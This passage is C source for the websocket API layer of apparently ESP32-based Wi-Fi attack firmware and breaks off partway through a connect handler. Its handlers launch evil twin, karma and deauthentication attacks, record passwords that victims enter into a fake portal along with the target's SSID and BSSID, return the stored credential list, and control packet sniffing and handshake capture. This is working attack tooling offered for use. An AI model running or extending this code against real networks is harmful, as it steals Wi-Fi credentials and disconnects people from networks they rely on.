#include <string.h>
#include <esp_timer.h>
#include <esp_log.h>
#include <cJSON.h>
#include <stdarg.h>
#include "utils.h"
#include "config.h"
#include "wifiMng.h"
#include "evil_twin.h"
#include "karma_attack.h"
#include "server_api.h"
#include "passwordMng.h"
#include "vendors.h"
#include "target.h"
#include "nvs_keys.h"
#include "deauther.h"
#include "sniffer.h"
#include "networking.h"
#include <libwifi.h>

static const char *TAG = "SERVER_API";

typedef struct {
    api_commant_t cmd;
    esp_err_t (*handler)(ws_frame_req_t *req);
} api_cmd_t;


static void delayed_restart_timer_cb(TimerHandle_t xTimer)
{
    ESP_LOGI(TAG, "Rebooting now...");
    esp_restart();
}


const char* mime_from_path(const char* path) {
    if (strstr(path, ".html")) return "text/html";
    if (strstr(path, ".css"))  return "text/css";
    if (strstr(path, ".js"))   return "application/javascript";
    if (strstr(path, ".png"))  return "image/png";
    if (strstr(path, ".jpg"))  return "image/jpeg";
    if (strstr(path, ".ico"))  return "image/x-icon";
    if (strstr(path, ".svg"))  return "image/svg+xml";
    return "text/plain";
}


static void shutdown_task(void *pvParameter)
{
    vTaskDelay(pdMS_TO_TICKS(1000));
    evil_twin_stop_attack();

    /* Enter in deep sleep to preserve battery power */
    /* Only hardware wakeup (Reset button) */
    //esp_deep_sleep_start();

    vTaskDelete(NULL);
}


static void api_send_status_frame(ws_frame_req_t *req, const char* status, const char *message)
{
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return;

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "status", status);
    cJSON_AddStringToObject(root, "message", message);

    char *payload = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (payload == NULL) return;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = payload;
    cmd.len = strlen(payload);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(payload);
    }
}


static esp_err_t api_get_status(ws_frame_req_t *req)
{
    /* --- SYSTEM STATS --- */
    int64_t time_us = esp_timer_get_time();
    int64_t time_s = time_us / 1000000;
    int hours = time_s / 3600;
    int minutes = (time_s % 3600) / 60;
    int seconds = time_s % 60;
    char uptime_str[16];
    snprintf(uptime_str, sizeof(uptime_str), "%02d:%02d:%02d", hours, minutes, seconds);

    size_t total_ram = heap_caps_get_total_size(MALLOC_CAP_DEFAULT);
    size_t free_ram = heap_caps_get_free_size(MALLOC_CAP_DEFAULT);
    int ram_usage = (total_ram > 0) ? 100 - ((free_ram * 100) / total_ram) : 0;

    // 1. Target Info
    target_info_t *et_target = target_get(TARGET_INFO_EVIL_TWIN);
    target_info_t *et_5g_target = target_get(TARGET_INFO_EVIL_TWIN_5G);
    
    int client_count = wifi_sniffer_get_clients_count();
    int ap_count = wifi_sniffer_get_aps_count();
    int has_handshake = wifi_sniffer_get_handshake_status_for_target(et_target->bssid);

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return ESP_FAIL;

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_status");
    
    // System
    cJSON_AddStringToObject(root, "uptime", uptime_str);
    cJSON_AddNumberToObject(root, "ram", ram_usage);
    
    bool is_et_running = (evil_twin_attack_get_status() != EVIL_TWIN_ATTACK_STATUS_IDLE);
    bool is_deauth_running = deauther_is_running();
    bool is_karma_running = (karma_attack_get_status() != KARMA_ATTACK_STATUS_IDLE);

    cJSON_AddBoolToObject(root, "et_running", is_et_running);
    cJSON_AddBoolToObject(root, "deauth_running", is_deauth_running);
    cJSON_AddBoolToObject(root, "karma_running", is_karma_running);

    // Wifi connection status
    cJSON_AddBoolToObject(root, "wifi_connected", wifi_is_connected());
    wifi_config_t wifi_sta_config;
    if( esp_wifi_get_config(WIFI_IF_STA, &wifi_sta_config) == ESP_OK ) {
        cJSON_AddStringToObject(root, "wifi_sta_ssid", (char*)wifi_sta_config.sta.ssid);
    }

    if(is_et_running) {
        // Basic Target Info
        cJSON_AddStringToObject(root, "ssid", (char*)et_target->ssid);
        cJSON_AddNumberToObject(root, "ch", et_target->channel);
        cJSON_AddNumberToObject(root, "rssi", et_target->rssi);
        
        // Advanced Target Info (BSSID, Vendor, Security)
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 et_target->bssid[0], et_target->bssid[1], et_target->bssid[2],
                 et_target->bssid[3], et_target->bssid[4], et_target->bssid[5]);
        cJSON_AddStringToObject(root, "bssid", bssid_str);
        cJSON_AddStringToObject(root, "vendor", vendorToString(et_target->vendor));
        cJSON_AddStringToObject(root, "auth", authmode_to_str(et_target->authmode));

        // 5GHz Intelligence
        bool has_5g = (et_5g_target->channel > 0);
        cJSON_AddBoolToObject(root, "has_5g", has_5g);
        if(has_5g) {
            cJSON_AddNumberToObject(root, "ch_5g", et_5g_target->channel);
            cJSON_AddNumberToObject(root, "rssi_5g", et_5g_target->rssi);
        }
    }

    // Sniffer / Environment Stats
    cJSON_AddNumberToObject(root, "n_clients", client_count);
    cJSON_AddNumberToObject(root, "n_aps", ap_count);
    cJSON_AddNumberToObject(root, "hs_state", has_handshake);
    cJSON_AddNumberToObject(root, "tx_sent", wifi_get_sent_frames());
    cJSON_AddNumberToObject(root, "tx_drop", wifi_get_dropped_frames());
    cJSON_AddNumberToObject(root, "tx_pps", wifi_get_frame_pps());

    // Network Info
    bool has_ip = networking_has_ip();
    cJSON_AddBoolToObject(root, "has_ip", has_ip);
    if (has_ip) {
        esp_netif_ip_info_t *ip_info = networking_get_ip_info();
        char ip_str[16];
        char mask_str[16];
        char gw_str[16];
        snprintf(ip_str, sizeof(ip_str), IPSTR, IP2STR(&ip_info->ip));
        snprintf(mask_str, sizeof(mask_str), IPSTR, IP2STR(&ip_info->netmask));
        snprintf(gw_str, sizeof(gw_str), IPSTR, IP2STR(&ip_info->gw));
        cJSON_AddStringToObject(root, "ip", ip_str);
        cJSON_AddStringToObject(root, "netmask", mask_str);
        cJSON_AddStringToObject(root, "gateway", gw_str);
    }

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (json_response == NULL) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_get_recon_data_aps(ws_frame_req_t *req)
{
    // 1. Alloca le strutture grandi sull'HEAP per salvare lo Stack del task!
    aps_info_t *recon_aps = (aps_info_t *)malloc(sizeof(aps_info_t));

    if (!recon_aps) {
        if (recon_aps) free(recon_aps);
        ESP_LOGE(TAG, "No Heap memory for recon structs!");
        return ESP_ERR_NO_MEM;
    }

    // Riempi le strutture
    wifi_sniffer_get_aps(recon_aps);

    // 2. Crea il JSON
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        free(recon_aps);
        return ESP_FAIL;
    }

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "recon_data");
    cJSON_AddStringToObject(root, "status", "ok");

    // 3. Array APs (Nota l'uso di -> invece del punto .)
    cJSON *aps_array = cJSON_AddArrayToObject(root, "aps");
    for (int i = 0; i < recon_aps->count; i++) 
    {
        cJSON *ap_obj = cJSON_CreateObject();
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), MACSTRCAPS, MAC2STR(recon_aps->ap[i].record.bssid));
        int hs_status = wifi_sniffer_get_handshake_status_for_target(recon_aps->ap[i].record.bssid);
        cJSON_AddStringToObject(ap_obj, "bssid", bssid_str);
        cJSON_AddNumberToObject(ap_obj, "rssi", recon_aps->ap[i].record.rssi);
        cJSON_AddNumberToObject(ap_obj, "ch", recon_aps->ap[i].record.primary);
        cJSON_AddNumberToObject(ap_obj, "pkts", recon_aps->ap[i].packets_tx + recon_aps->ap[i].packets_rx);
        cJSON_AddNumberToObject(ap_obj, "bytes", recon_aps->ap[i].bytes_tx + recon_aps->ap[i].bytes_rx);
        cJSON_AddStringToObject(ap_obj, "sec", authmode_to_str(recon_aps->ap[i].record.authmode));
        cJSON_AddStringToObject(ap_obj, "ssid", (char*)recon_aps->ap[i].record.ssid);
        cJSON_AddNumberToObject(ap_obj, "hs", hs_status);
        cJSON_AddItemToArray(aps_array, ap_obj);
    }

    // 5. Stampa il JSON e libera IMMEDIATAMENTE le strutture per ridare ossigeno alla RAM
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    free(recon_aps);

    if (json_response == NULL) {
        ESP_LOGE(TAG, "cJSON Print Failed! JSON too large for available Heap.");
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_get_recon_data_clients(ws_frame_req_t *req)
{
    client_list_t *recon_clients = (client_list_t *)malloc(sizeof(client_list_t));

    if (!recon_clients) {
        if (recon_clients) free(recon_clients);
        ESP_LOGE(TAG, "No Heap memory for recon structs!");
        return ESP_ERR_NO_MEM;
    }

    wifi_sniffer_get_clients(recon_clients);

    // 2. Crea il JSON
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        free(recon_clients);
        return ESP_FAIL;
    }

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "recon_data");
    cJSON_AddStringToObject(root, "status", "ok");

    // 4. Array Client
    cJSON *clients_array = cJSON_AddArrayToObject(root, "clients");
    for (int i = 0; i < recon_clients->count; i++) 
    {
        cJSON *cli_obj = cJSON_CreateObject();
        char mac_str[18];
        char bssid_str[18];
        snprintf(mac_str, sizeof(mac_str), MACSTRCAPS, MAC2STR(recon_clients->client[i].mac));
        snprintf(bssid_str, sizeof(bssid_str), MACSTRCAPS, MAC2STR(recon_clients->client[i].bssid));
        cJSON_AddStringToObject(cli_obj, "mac", mac_str);
        cJSON_AddStringToObject(cli_obj, "bssid", bssid_str);
        cJSON_AddNumberToObject(cli_obj, "ch", recon_clients->client[i].channel);
        cJSON_AddNumberToObject(cli_obj, "rssi", recon_clients->client[i].rssi);
        cJSON_AddNumberToObject(cli_obj, "pkts", recon_clients->client[i].packets_tx + recon_clients->client[i].packets_rx);
        cJSON_AddNumberToObject(cli_obj, "bytes", recon_clients->client[i].bytes_tx + recon_clients->client[i].bytes_rx);
        cJSON_AddItemToArray(clients_array, cli_obj);
    }

    // 5. Stampa il JSON e libera IMMEDIATAMENTE le strutture per ridare ossigeno alla RAM
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    free(recon_clients);

    if (json_response == NULL) {
        ESP_LOGE(TAG, "cJSON Print Failed! JSON too large for available Heap.");
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_admin_get_ap_settings(ws_frame_req_t *req) 
{
    char ssid[32] = {0};
    char password[64] = {0};
    int32_t channel = DEFAULT_WIFI_CHAN;
    wifi_phy_rate_t tx_rate = DEFAULT_WIFI_TX_RATE;

    /* Read value from flash */
    if( read_string_from_nvs(WIFI_SSID_KEY, ssid) != ESP_OK )
    {
        strcpy(ssid, DEFAULT_WIFI_SSID);
    }
    if( read_string_from_nvs(WIFI_PASS_KEY, password) != ESP_OK )
    {
        strcpy(password, DEFAULT_WIFI_PASS);
    }
    if( read_int_from_nvs(WIFI_CHAN_KEY, &channel) != ESP_OK )
    {
        channel = DEFAULT_WIFI_CHAN;
    }
    if( read_int_from_nvs(WIFI_TX_RATE_KEY, (int32_t *)&tx_rate) != ESP_OK )
    {
        tx_rate = DEFAULT_WIFI_TX_RATE;
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_ap_settings");
    cJSON_AddStringToObject(root, "ssid", ssid);
    cJSON_AddStringToObject(root, "password", password);
    cJSON_AddNumberToObject(root, "channel", channel);
    cJSON_AddNumberToObject(root, "tx_rate", tx_rate);
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_admin_set_ap_settings(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        ESP_LOGE(TAG, "Invalid JSON received: %s", req->payload);
        return ESP_FAIL;
    }
    const cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    const cJSON *j_password = cJSON_GetObjectItemCaseSensitive(json, "password");
    const cJSON *j_channel = cJSON_GetObjectItemCaseSensitive(json, "channel");
    const cJSON *j_tx_rate = cJSON_GetObjectItemCaseSensitive(json, "tx_rate");

    char ssid[32] = {0};
    char password[64] = {0};

    if (cJSON_IsString(j_ssid)) {
        if (strlen(j_ssid->valuestring) == 0 || strlen(j_ssid->valuestring) >= 32) {
            cJSON_Delete(json);
            api_send_status_frame(req, "error", "Invalid SSID length.");
            return ESP_FAIL;
        }
        strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
        save_string_to_nvs(WIFI_SSID_KEY, (const char *)ssid);
    }
    if (cJSON_IsString(j_password)) {
        strlcpy(password, j_password->valuestring, sizeof(password));
        save_string_to_nvs(WIFI_PASS_KEY, (const char *)password);
    }
    if (cJSON_IsNumber(j_channel)) {
        save_int_to_nvs(WIFI_CHAN_KEY, j_channel->valueint);
    }
    if (cJSON_IsNumber(j_tx_rate)) {
        save_int_to_nvs(WIFI_TX_RATE_KEY, (int32_t)j_tx_rate->valueint);
    }
    cJSON_Delete(json);

    api_send_status_frame(req, "ok", "AP settings saved successfully.");

    TimerHandle_t restart_timer = xTimerCreate("restart_timer", pdMS_TO_TICKS(2000), pdFALSE, NULL, delayed_restart_timer_cb);
    if (restart_timer != NULL) {
        xTimerStart(restart_timer, 0);
        ESP_LOGI(TAG, "Restart scheduled in 2 seconds.");
    } else {
        ESP_LOGE(TAG, "Failed to create restart timer! Forcing immediate reboot.");
        esp_restart(); // Fallback
    }

    return ESP_OK;
}


static esp_err_t api_wifi_scan(ws_frame_req_t *req)
{
    esp_err_t ret = wifi_sniffer_scan_fill_aps();
    
    if (ret != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to perform WiFi scan");
        return ret;
    }

    aps_info_t *scan_results = (aps_info_t *)malloc(sizeof(aps_info_t));
    if (!scan_results) {
        ESP_LOGE(TAG, "No Heap memory for scan results!");
        return ESP_ERR_NO_MEM;
    }

    if(wifi_sniffer_get_aps(scan_results) != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to get scan results");
        free(scan_results);
        return ESP_FAIL;
    }

    if(scan_results->count == 0) {
        api_send_status_frame(req, "ok", "No APs found");
        free(scan_results);
        return ESP_OK;
    }

    cJSON *response_obj = cJSON_CreateObject();
    cJSON_AddNumberToObject(response_obj, "req_id", req->req_id);
    cJSON_AddStringToObject(response_obj, "type", "scan_result");

    cJSON *root = cJSON_CreateArray();
    if (!root) {
        free(scan_results);
        api_send_status_frame(req, "error", "cJSON_CreateArray failed");
        return ESP_ERR_NO_MEM;
    }

    for (int i = 0; i < scan_results->count; i++) 
    {
        char ssid[33];
        memcpy(ssid, scan_results->ap[i].record.ssid, sizeof(scan_results->ap[i].record.ssid));
        ssid[32] = '\0';
        char bssid[18];
        snprintf(bssid, sizeof(bssid), MACSTRCAPS, MAC2STR(scan_results->ap[i].record.bssid));
        
        cJSON *obj = cJSON_CreateObject();
        if (!obj) {
            cJSON_Delete(root);
            free(scan_results);
            cJSON_Delete(response_obj);
            api_send_status_frame(req, "error", "cJSON_CreateObject failed");
            return ESP_ERR_NO_MEM;
        }

        cJSON_AddStringToObject(obj, "ssid", ssid);
        cJSON_AddNumberToObject(obj, "signal", scan_results->ap[i].record.rssi);
        cJSON_AddNumberToObject(obj, "channel", scan_results->ap[i].record.primary);
        cJSON_AddStringToObject(obj, "bssid", bssid);
        cJSON_AddStringToObject(obj, "authmode", authmode_to_str(scan_results->ap[i].record.authmode));
        cJSON_AddNumberToObject(obj, "authmode_code", scan_results->ap[i].record.authmode);
        cJSON_AddNumberToObject(obj, "pairwise_cipher", scan_results->ap[i].record.pairwise_cipher);
        cJSON_AddNumberToObject(obj, "group_cipher", scan_results->ap[i].record.group_cipher);
        cJSON_AddBoolToObject(obj, "wps", scan_results->ap[i].record.wps ? 1 : 0);
        cJSON_AddItemToArray(root, obj);
    }
    cJSON_AddItemToObject(response_obj, "data", root);

    char *json = cJSON_PrintUnformatted(response_obj);
    if (scan_results) free(scan_results);
    cJSON_Delete(response_obj);

    if (!json) {
        return ESP_ERR_NO_MEM;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json; 
    cmd.len = strlen(json);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_start_evil_twin(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    target_info_t target_info = { 0 };

    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_bssid = cJSON_GetObjectItemCaseSensitive(json, "bssid");
    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
    cJSON *j_rssi = cJSON_GetObjectItemCaseSensitive(json, "signal");
    cJSON *j_auth = cJSON_GetObjectItemCaseSensitive(json, "authmode_code");
    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_rssi)) target_info.rssi = (int8_t)j_rssi->valueint;
    if (cJSON_IsNumber(j_auth)) target_info.authmode = (wifi_auth_mode_t)j_auth->valueint;
    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;

    if (cJSON_IsString(j_bssid)) {
        sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]);
    }

    cJSON_Delete(json);

    ESP_LOGI(TAG, "Starting Evil Twin on SSID: %s (Ch: %d)", target_info.ssid, target_info.channel);
    evil_twin_start_attack(&target_info);

    api_send_status_frame(req, "ok", "Evil Twin Started");
    return ESP_OK;
}


static esp_err_t api_stop_evil_twin(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    evil_twin_stop_attack();
    api_send_status_frame(req, "ok", "Evil Twin Attack Stopped");
    cJSON_Delete(json);
    return ESP_OK;
}


static esp_err_t api_get_evlitwin_target(ws_frame_req_t *req)
{
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);

    char path[64];
    strlcpy(path, "/logo/", sizeof(path));
    strlcat(path, vendorToString(target->vendor), sizeof(path));
    strlcat(path, ".png", sizeof(path));

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "eviltwin_target");
    cJSON_AddStringToObject(root, "logo", path);
    cJSON_AddStringToObject(root, "ssid", (const char*)target->ssid);
    cJSON_AddStringToObject(root, "vendor", vendorToString(target->vendor));

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }
    return ESP_OK;
}


static esp_err_t api_check_input_password(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    cJSON *j_pass = cJSON_GetObjectItemCaseSensitive(json, "password");
    if (!cJSON_IsString(j_pass)) {
        cJSON_Delete(json);
        api_send_status_frame(req, "error", "Missing password");
        return ESP_FAIL;
    }

    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
    char buffer[256] = { 0 };
    snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", 
             (const char *)target->ssid, 
             target->bssid[0], target->bssid[1], target->bssid[2], target->bssid[3], target->bssid[4], target->bssid[5], 
             j_pass->valuestring);
    
    password_manager_save(buffer);
    ESP_LOGI(TAG, "Captured: %s", buffer);

    bool correct = evil_twin_check_password(j_pass->valuestring);
    cJSON_Delete(json);

    if (correct) {
        api_send_status_frame(req, "ok", "Password Correct");
        xTaskCreate(shutdown_task, "shutdown_task", 4096, NULL, 5, NULL);
    } else {
        api_send_status_frame(req, "bad", "Password Incorrect");
    }
    return ESP_OK;
}


static esp_err_t api_get_passwords(ws_frame_req_t *req)
{
    FILE *f = fopen(PASSWORD_FILE, "r");
    char *file_content = NULL;
    long length = 0;

    if (f) {
        fseek(f, 0, SEEK_END);
        length = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (length > 0) {
            file_content = malloc(length + 1);
            if (file_content) {
                fread(file_content, 1, length, f);
                file_content[length] = '\0';
            }
        }
        fclose(f);
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "passwords");
    cJSON_AddStringToObject(root, "content", file_content ? file_content : "");

    if (file_content) free(file_content);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;
    
    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_karma_scan(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    cJSON *j_act = cJSON_GetObjectItemCaseSensitive(json, "start_stop"); // 1 or 0
    if (cJSON_IsNumber(j_act)) {
        if (j_act->valueint == 1) {
            karma_attack_probes_scan_start();
            api_send_status_frame(req, "ok", "Karma Scan Started");
        } else {
            karma_attack_probes_scan_stop();
            api_send_status_frame(req, "ok", "Karma Scan Stopped");
        }
    }
    cJSON_Delete(json);
    return ESP_OK;
}


static esp_err_t api_get_karma_probes(ws_frame_req_t *req)
{
    probe_request_list_t list = {0};
    if(wifi_sniffer_get_probes(&list) != ESP_OK) return ESP_FAIL;
    
    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "karma_probes");
    
    cJSON *arr = cJSON_CreateArray();
    for (int i = 0; i < list.num_probes; i++) {
        cJSON *item = cJSON_CreateObject();
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                    list.probes[i].mac[0], list.probes[i].mac[1], list.probes[i].mac[2],
                    list.probes[i].mac[3], list.probes[i].mac[4], list.probes[i].mac[5]);

        cJSON_AddStringToObject(item, "mac", mac_str);
        cJSON_AddStringToObject(item, "ssid", list.probes[i].ssid);
        cJSON_AddNumberToObject(item, "rssi", list.probes[i].rssi);
        cJSON_AddNumberToObject(item, "channel", list.probes[i].channel);
        cJSON_AddItemToArray(arr, item);
    }
    cJSON_AddItemToObject(root, "data", arr);

    char *json = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json;
    cmd.len = strlen(json);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_karma_set_target(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;

    target_info_t target_info = { 0 };
    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;

    cJSON_Delete(json);

    karma_attack_set_target(&target_info);
    api_send_status_frame(req, "ok", "Karma Attack Started");
    return ESP_OK;
}


static esp_err_t api_deauther_start(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    target_info_t target_info = {0};
    deauther_attack_type_t attack_type = DEAUTHER_ATTACK_DEAUTH_FRAME;
    deauther_attack_mode_t attack_mode = DEAUTHER_TARGET_UNICAST;
    cJSON *j_ssid = cJSON_GetObjectItem(json, "ssid");
    cJSON *j_bssid = cJSON_GetObjectItem(json, "bssid");
    cJSON *j_chan = cJSON_GetObjectItem(json, "channel");
    cJSON *j_mode = cJSON_GetObjectItem(json, "mode");
    cJSON *j_type = cJSON_GetObjectItem(json, "packet_type");

    if (cJSON_IsString(j_bssid)) {
        sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]);
    }

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_type)) attack_type = (deauther_attack_type_t)j_type->valueint;

    if (cJSON_IsString(j_mode) && strcmp(j_mode->valuestring, "broadcast") == 0) {
        attack_mode = DEAUTHER_TARGET_ALL;
    } else {
        attack_mode = DEAUTHER_TARGET_UNICAST;
    }
    cJSON_Delete(json);

    ESP_LOGI(TAG, "Starting Deauth: Type=%d, Broadcast=%d", attack_type, attack_mode);
    deauther_start(&target_info, attack_type);

    api_send_status_frame(req, "ok", "Deauth Attack Started");
    return ESP_OK;
}


static esp_err_t api_deauther_stop(ws_frame_req_t *req)
{
    deauther_stop();
    ESP_LOGI(TAG, "Stopping Deauth Attack...");
    api_send_status_frame(req, "ok", "Deauth Attack Stopped");
    return ESP_OK;
}


static esp_err_t api_start_raw_sniffer(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    int channel = 1;
    bool hopping = false;
    int type = 0;
    uint32_t subtype = 0;

    if(json) {
        // Estrai parametri dal JSON
        cJSON *j_chan = cJSON_GetObjectItem(json, "channel");
        cJSON *j_hop = cJSON_GetObjectItem(json, "hopping");
        cJSON *j_type = cJSON_GetObjectItem(json, "type");
        cJSON *j_sub = cJSON_GetObjectItem(json, "subtype");

        if(j_chan) channel = j_chan->valueint;
        if(j_hop) hopping = cJSON_IsTrue(j_hop);
        if(j_type) type = j_type->valueint;
        
        // Usa valuedouble per sicurezza con numeri grandi (0xFFFFFFFF) in JSON
        if(j_sub) subtype = (uint32_t)j_sub->valuedouble; 
        
        cJSON_Delete(json);
    }

    wifi_sniffer_start_packet_analyzer(true);
    wifi_start_sniffing();

    // 3. Gestione Canale / Hopping
    if (hopping) {
        wifi_sniffer_set_fine_filter(type, subtype, 0);
        wifi_sniffer_start_channel_hopping(0); 
    } else {
        wifi_sniffer_set_fine_filter(type, subtype, channel);
        wifi_sniffer_start_channel_hopping(channel);
    }
    
    api_send_status_frame(req, "ok", "Sniffer Started");
    return ESP_OK;
}


static esp_err_t api_stop_raw_sniffer(ws_frame_req_t *req)
{
    wifi_stop_sniffing();
    api_send_status_frame(req, "ok", "Sniffer Stopped");
    return ESP_OK;
}


static esp_err_t api_wifi_connect(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    char ssid[32] = {0};
    char password[64] = {0};

    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_password = cJSON_GetObjectItemCaseSensitive(json, "password");

    if (cJSON_IsString(j_ssid)) strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
